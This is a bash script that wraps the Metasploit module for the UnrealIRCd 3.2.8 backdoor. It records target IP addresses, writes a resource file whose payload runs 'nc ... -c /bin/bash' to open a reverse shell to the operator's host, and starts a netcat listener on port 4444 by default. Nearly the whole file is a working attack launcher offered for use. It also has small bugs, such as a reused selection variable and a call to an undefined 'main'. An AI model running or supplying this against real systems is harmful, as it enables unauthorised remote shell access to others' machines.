
readrecent(){						#start read recent target function
	content=$(sed '1q;d' targetlist.txt)		#read first line of file
	echo "Your most recent target is $content"	#output previous target

}

saveTarget(){						#start save function
	sed -i "1 i $targ" targetlist.txt		#save target ip entered to file
}

echo -e "\e[31mUnrealIRCD 3.2.8 backdoor exploitation\e[0m" #display exploit name
readrecent	#get most recent ip
read -p "TARGET IP:  " targ 				#ask for target ip
saveTarget $targ 					#save ip
echo -e "\e[31mYour Local IP Address is:\e[0m "; hostname -I | awk '{print $1}'			#display local ip
echo -e "\e[31mWould you like to use this IP Address\e[0m(1)\e[31mor Specify Another?\e[0m(2)"	
#prompt user, use local ip or select another
read -p "(1)/(2): " sel
case $sel in			#input validation

  	1)			#if 1 selected use local ip
  	loc=$(hostname -I)
    	;;

  	2)			#if 2 selected ask user for new ip
	read -p "LOCAL IP: " loc
    	;;
	*)
    	echo "Invalid Selection! ! !"	#if invalid response restart script
    	main
    	;;
	esac
clear
echo -e "\e[31mWould you like to use the default Local Port 4444 \e[0m (1) \e[31m Or Select Another?\e[0m (2)" #ask user for port
read -p "(1)/(2): "
case $sel in
	1)		#if 1 use default port
	prt="4444"
	;;
	
	2)		#if 2 ask user for port number
	read -p "Port: " prt
	;;
	
	*)		#if invalid restart script 
	echo -e "\e[31mInvalid Selection! Please SELECT a valid choice\e[0m"
	main
	;;
	esac
clear
printf "TARGET IP --> $targ\nLocal IP --> $loc\nLocal Port --> $prt\n"	#show options configured
echo -e "\e[31mdo you wish to EXECUTE?\e[0m"				#ask user for consent to execute
read -p "(Y)/(N): " ready
case $ready in
	 Y)
	 	echo "EXECUTING"
	 	echo "use exploit/unix/irc/unreal_ircd_3281_backdoor
	 	set RHOST $targ
	 	set payload /cmd/unix/generic
	 	set CMD nc -nv $loc $prt -c /bin/bash
	 	exploit" > msfexploit1.sh				#write exploit configuration to resource file
	 	xterm -e msfconsole -q -r msfexploit1.sh & nc -nlvp $prt	
	 	#execute script in msfconsole in new terminal tab, run netcat

	;;
	N)
		clear
		echo "Aborting"
		read -p "Do you wish to Return to the Menu (1) Quit (2) or reenter information (3)  " selection
		case $selection in 
		1)
		bash menu.sh
		;;
		3)
		bash exploit1.sh
		;;
		*)
		echo "goodbye"
		;;
		esac 
	;;
	esac


